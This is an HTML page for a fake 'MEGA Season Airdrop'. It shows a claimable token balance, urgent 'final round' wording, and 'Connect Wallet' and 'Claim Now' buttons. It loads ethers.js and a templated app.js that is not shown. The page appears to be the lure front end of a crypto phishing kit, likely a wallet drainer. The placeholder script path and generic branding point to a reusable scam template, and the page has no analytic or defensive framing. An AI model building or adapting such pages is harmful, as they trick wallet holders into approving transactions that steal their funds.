<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MEGA Airdrop — Final Round</title>
<style>
:root{--bg:#05070f;--acc:#ff2d75;--acc2:#7c4dff;--ok:#00e676;--err:#ff5252;--txt:#eef2ff;--mut:#7a8296}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:linear-gradient(180deg,#0b1020,#05070f);color:var(--txt);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.wrap{max-width:460px;width:100%;text-align:center}
.hero-icon{font-size:56px;margin-bottom:10px}
h1{font-size:24px;margin-bottom:4px}
.sub{color:var(--mut);font-size:13px;margin-bottom:20px}
.pnl{background:rgba(124,77,255,.08);border:1px solid rgba(124,77,255,.35);border-radius:16px;padding:24px;margin-bottom:14px}
.val{font-size:36px;font-weight:800;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.lbl{font-size:12px;color:var(--mut);margin-top:4px}
.btn{width:100%;padding:15px;border:none;border-radius:14px;font-size:15px;font-weight:700;cursor:pointer;color:#fff;margin-top:10px;transition:.2s}
.btn-connect{background:linear-gradient(90deg,var(--acc2),var(--acc))}
.btn-connect:hover{transform:translateY(-2px)}
.btn-claim{background:linear-gradient(90deg,#ffd200,#ff9000)}
.btn-claim:hover{transform:translateY(-2px)}
.status{font-size:12px;color:var(--mut);margin-top:12px}
.wallet-pill{display:none;background:rgba(255,45,117,.15);border:1px solid rgba(255,45,117,.4);border-radius:20px;padding:7px 14px;font-size:12px;color:#ff8fb5;margin:0 auto 12px;width:fit-content}
.loader{display:none;margin-top:10px;font-size:12px;color:var(--acc2)}
.spinner{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s infinite;vertical-align:-1px;margin-right:5px}
@keyframes spin{to{transform:rotate(360deg)}}
.f{font-size:10px;color:#3a4260;margin-top:10px}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(124,77,255,.5)}50%{box-shadow:0 0 40px var(--acc2)}}
.pulse{animation:pulse 2s infinite}
</style>
</head>
<body>
<div class="wrap">
  <div class="hero-icon pulse">💎</div>
  <h1>MEGA Season Airdrop</h1>
  <div class="sub">Final distribution round — connect wallet to claim</div>
  <div class="pnl">
    <div class="val" id="amt">3,500 MEGA</div>
    <div class="lbl">Claimable rewards</div>
  </div>
  <div class="wallet-pill" id="wpill">🔒 <span id="waddr"></span></div>
  <button class="btn btn-connect" id="btnConnect">🔗 Connect Wallet</button>
  <button class="btn btn-claim" id="btnClaim" style="display:none">🎁 Claim Now</button>
  <div class="loader" id="loader"><span class="spinner"></span>Processing…</div>
  <div class="status" id="status">Compatible with MetaMask, Trust Wallet, OKX</div>
  <div class="f">© 2025 MEGA Protocol</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script src="__TPLPATH__app.js"></script>
</body>
</html>
